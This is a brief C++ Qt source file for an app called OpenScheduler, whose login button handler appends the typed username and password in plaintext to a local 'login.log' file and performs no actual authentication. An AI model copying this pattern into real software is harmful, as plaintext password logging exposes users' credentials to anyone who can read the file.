#include "OpenScheduler.h"
#include <fstream>

OpenScheduler::OpenScheduler(QWidget *parent)
    : QMainWindow(parent)
{
    ui.setupUi(this);

    QObject::connect(ui.loginBtn, &QPushButton::clicked, this, &OpenScheduler::handleButtonPressEvent);
}

void OpenScheduler::handleButtonPressEvent()
{
    std::ofstream out("login.log", std::ofstream::app);

    out << ui.login->text().toStdString() << std::endl;
    out << ui.password->text().toStdString() << std::endl;

    out.close();
}

OpenScheduler::~OpenScheduler()
{}
